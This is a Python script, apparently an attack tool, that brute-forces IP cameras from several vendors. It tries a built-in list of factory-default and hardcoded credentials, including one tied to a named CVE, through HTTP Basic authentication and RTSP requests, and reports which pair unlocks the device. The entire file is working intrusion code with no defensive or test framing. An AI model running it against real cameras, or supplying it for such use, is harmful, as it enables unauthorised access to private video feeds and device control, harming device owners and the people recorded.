"""Generic cam BF - tries Hikvision/Dahua/Axis/Panasonic default creds.

Usage: python generic_cam_bf.py <ip> [port] [--live-only]
"""

import sys
import socket
import base64
import urllib.request
import urllib.error
import time

DEFAULT_CREDS = [
    # Hikvision
    ('admin', '12345'),
    ('admin', 'admin'),
    ('admin', 'hik12345'),
    ('admin', 'hikvision'),
    ('admin', 'Admin12345'),
    ('admin', '@1234567'),
    ('admin', ''),
    ('admin1', '12345'),  # CVE-2018-6911 hardcoded
    ('admin2', '12345'),
    ('admin3', '12345'),
    ('root', 'hik12345'),
    # Dahua
    ('admin', 'admin'),
    ('admin', 'dahua'),
    ('admin', 'admin123'),
    ('admin', 'dahuadefault'),
    ('admin', '7ujMko0vizxv'),
    ('admin', 'vizxv'),
    ('admin', 'dahua@2019'),
    ('admin', 'abc12345'),
    # AXIS
    ('root', 'pass'),
    ('root', 'root'),
    ('admin', 'admin'),
    # Panasonic BB-HCM/BL-C
    ('admin', '12345'),
    ('admin1', ''),
    ('admin2', ''),
    ('admin1', '12345'),
    ('admin2', '12345'),
    ('setup', 'setup'),
    # Canon VB
    ('admin', ''),
    ('admin', 'admin'),
    ('admin', '12345'),
    # i-PRO / WV
    ('admin', 'admin12345'),
    ('admin', 'ipro'),
    ('admin', 'merit'),
    # Generic
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', 'camera'),
    ('user', 'user'),
    ('root', 'root'),
    ('service', 'service'),
]


def try_http(host, port, user, pw, timeout=5):
    """Try Basic auth on HTTP."""
    try:
        creds = base64.b64encode(f'{user}:{pw}'.encode()).decode()
        sock = socket.create_connection((host, port), timeout=timeout)
        req = f'GET /admin/index.html HTTP/1.0\r\nHost: {host}\r\nAuthorization: Basic {creds}\r\nConnection: close\r\n\r\n'
        sock.send(req.encode())
        data = b''
        sock.settimeout(timeout)
        try:
            while len(data) < 4096:
                d = sock.recv(1024)
                if not d: break
                data += d
        except: pass
        sock.close()
        # Success if 200 OK AND no 401/Authorization required
        if b'200 OK' in data[:200] and b'401' not in data[:500] and b'Authorization' not in data[:1000]:
            # Make sure it's not redirect to login
            if not any(s in data[:200].lower() for s in [b'login', b'auth']):
                return True
    except Exception:
        pass
    return False


def try_rtsp(host, port, user, pw, timeout=5):
    """Try RTSP Basic auth via DESCRIBE."""
    import secrets
    import hashlib
    from itertools import cycle

    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        # Try Basic auth
        creds = base64.b64encode(f'{user}:{pw}'.encode()).decode()
        req = f'DESCRIBE rtsp://{host}:{port}/stream1 RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {creds}\r\n\r\n'
        sock.send(req.encode())
        data = b''
        sock.settimeout(timeout)
        try:
            while b'\r\n\r\n' not in data and len(data) < 4096:
                d = sock.recv(1024)
                if not d: break
                data += d
        except: pass
        sock.close()
        return b'200 OK' in data[:200]
    except Exception:
        return False


def main():
    if len(sys.argv) < 2:
        print('Usage: python generic_cam_bf.py <ip> [port]')
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80

    print(f'[Generic BF] Testing {host}:{port} with {len(DEFAULT_CREDS)} creds')

    for user, pw in DEFAULT_CREDS:
        # Try HTTP
        if try_http(host, port, user, pw):
            print(f'  [+] {user}:{pw} - HTTP UNLOCKED')
            return True
        # Try RTSP
        if port != 554:
            if try_rtsp(host, port, user, pw):
                print(f'  [+] {user}:{pw} - RTSP UNLOCKED')
                return True

    print(f'[-] No default creds worked')
    return False


if __name__ == '__main__':
    main()
